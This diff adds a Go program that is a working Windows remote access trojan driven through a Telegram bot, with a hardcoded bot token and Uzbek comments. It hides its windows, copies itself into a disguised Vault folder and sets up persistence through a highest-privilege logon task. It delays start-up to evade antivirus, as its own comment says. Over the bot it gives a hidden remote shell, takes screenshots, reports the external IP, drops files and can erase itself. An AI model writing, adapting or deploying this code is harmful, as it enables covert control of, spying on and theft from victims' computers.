@@ -1,0 +1,213 @@
+package main
+
+import (
+	"fmt"
+	"image/png"
+	"io"
+	"net/http"
+	"os"
+	"os/exec"
+	"path/filepath"
+	"reflect"
+	"runtime"
+	"strconv"
+	"syscall"
+	"time"
+
+	"github.com/kbinani/screenshot"
+	tele "gopkg.in/telebot.v3"
+)
+
+// ================= Config & Globals =================
+var (
+	// Ma'lumotlarni shu yerda tahrirlang yoki build vaqtida -ldflags ishlating
+	T       = "8536931376:AAEuf35FhfFdOKoZsyqnApDRkx7olCX8xHc"
+	A       = "6504383276"
+	AdminID int64
+	shMode  = true // Avtomatik yoqilgan holatda
+
+	persistentCmd *exec.Cmd
+	cmdStdin      io.WriteCloser
+)
+
+// ================= Security & Stealth =================
+
+func setStealth(attr *syscall.SysProcAttr) {
+	if runtime.GOOS == "windows" {
+		v := reflect.ValueOf(attr).Elem()
+		f := v.FieldByName("HideWindow")
+		if f.IsValid() && f.CanSet() {
+			f.SetBool(true)
+		}
+	}
+}
+
+func autoStart() {
+	if runtime.GOOS != "windows" {
+		return
+	}
+	targetDir := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Vault")
+	targetExe := filepath.Join(targetDir, "win_vault.exe")
+	self, _ := os.Executable()
+
+	if filepath.Clean(self) != filepath.Clean(targetExe) {
+		os.MkdirAll(targetDir, 0755)
+		src, _ := os.Open(self)
+		dst, _ := os.Create(targetExe)
+		io.Copy(dst, src)
+		src.Close()
+		dst.Close()
+
+		// HIGHEST PRIVILEGE: Task Scheduler orqali admin darajasida o'rnashish
+		cmd := exec.Command("schtasks", "/create", "/tn", "WinVaultUpdate", "/tr", targetExe, "/sc", "onlogon", "/rl", "highest", "/f")
+		cmd.SysProcAttr = &syscall.SysProcAttr{}
+		setStealth(cmd.SysProcAttr)
+		cmd.Run()
+
+		exec.Command("cmd", "/c", "start", "", targetExe).Start()
+		os.Exit(0)
+	}
+}
+
+// ================= Terminal & Shell =================
+
+func startPersistentCmd(c tele.Context) {
+	if persistentCmd != nil {
+		return
+	}
+	persistentCmd = exec.Command("cmd.exe")
+	persistentCmd.SysProcAttr = &syscall.SysProcAttr{}
+	setStealth(persistentCmd.SysProcAttr)
+
+	stdin, _ := persistentCmd.StdinPipe()
+	stdout, _ := persistentCmd.StdoutPipe()
+	cmdStdin = stdin
+	persistentCmd.Start()
+
+	go func() {
+		buf := make([]byte, 4096)
+		for {
+			n, err := stdout.Read(buf)
+			if n > 0 {
+				res := string(buf[:n])
+				if len(res) > 4000 {
+					res = res[:4000]
+				}
+				c.Send("```\n"+res+"\n```", tele.ModeMarkdown)
+			}
+			if err != nil {
+				persistentCmd = nil
+				break
+			}
+		}
+	}()
+}
+
+// ================= Main Logic =================
+
+func main() {
+	// Antivirus tahlilini qiyinlashtirish uchun kutish
+	time.Sleep(7 * time.Second)
+	autoStart()
+
+	AdminID, _ = strconv.ParseInt(A, 10, 64)
+
+	bot, err := tele.NewBot(tele.Settings{
+		Token:  T,
+		Poller: &tele.LongPoller{Timeout: 10 * time.Second},
+	})
+	if err != nil {
+		return
+	}
+
+	// Faqat belgilangan Admin ID uchun ruxsat
+	bot.Use(func(next tele.HandlerFunc) tele.HandlerFunc {
+		return func(c tele.Context) error {
+			if c.Sender().ID != AdminID {
+				return nil
+			}
+			return next(c)
+		}
+	})
+
+	// --- Buyruqlar ---
+
+	bot.Handle("/on", func(c tele.Context) error {
+		shMode = true
+		return c.Send("🟢 Terminal rejimi faollashdi.")
+	})
+
+	bot.Handle("/off", func(c tele.Context) error {
+		shMode = false
+		return c.Send("🔴 Terminal rejimi yopildi.")
+	})
+
+	bot.Handle("/cmd", func(c tele.Context) error {
+		startPersistentCmd(c)
+		return c.Send("⌨️ Persistent CMD seansi ochildi.")
+	})
+
+	bot.Handle("/screen", func(c tele.Context) error {
+		n := screenshot.NumActiveDisplays()
+		for i := 0; i < n; i++ {
+			bounds := screenshot.GetDisplayBounds(i)
+			img, err := screenshot.CaptureRect(bounds)
+			if err != nil {
+				continue
+			}
+			path := filepath.Join(os.TempDir(), fmt.Sprintf("scr_%d.png", i))
+			f, _ := os.Create(path)
+			png.Encode(f, img)
+			f.Close()
+			c.Send(&tele.Photo{File: tele.FromDisk(path)})
+			os.Remove(path)
+		}
+		return nil
+	})
+
+	bot.Handle("/ip", func(c tele.Context) error {
+		resp, _ := http.Get("https://api.ipify.org")
+		ip, _ := io.ReadAll(resp.Body)
+		return c.Send("🌐 Tashqi IP: " + string(ip))
+	})
+
+	bot.Handle("/purge", func(c tele.Context) error {
+		c.Send("🗑 Sakinai o'zini butunlay o'chirmoqda...")
+		exec.Command("schtasks", "/delete", "/tn", "WinVaultUpdate", "/f").Run()
+		self, _ := os.Executable()
+		batch := fmt.Sprintf("@echo off\ntimeout /t 3\ndel /f /q \"%s\"\ndel %%0", self)
+		os.WriteFile("cl.bat", []byte(batch), 0644)
+		exec.Command("cmd", "/c", "start /b cl.bat").Start()
+		os.Exit(0)
+		return nil
+	})
+
+	// --- Terminal boshqaruvi va Avtomatik CMD ---
+	bot.Handle(tele.OnText, func(c tele.Context) error {
+		if shMode {
+			// Agar CMD seansi hali ochilmagan bo'lsa, avtomatik ochish
+			if persistentCmd == nil {
+				startPersistentCmd(c)
+				time.Sleep(500 * time.Millisecond) // Seans tayyor bo'lishi uchun kichik kutish
+			}
+			
+			if cmdStdin != nil {
+				_, err := fmt.Fprintln(cmdStdin, c.Text())
+				if err != nil {
+					return c.Send("❌ CMD xatosi: " + err.Error())
+				}
+				return nil
+			}
+		}
+		return c.Send("ℹ️ Terminal rejimi o'chiq. Yoqish uchun: /on")
+	})
+
+	// Fayl qabul qilish
+	bot.Handle(tele.OnDocument, func(c tele.Context) error {
+		path := filepath.Join(os.TempDir(), c.Message().Document.FileName)
+		bot.Download(&c.Message().Document.File, path)
+		return c.Send("📥 Fayl saqlandi: " + path)
+	})
+
+	bot.Start()
+}
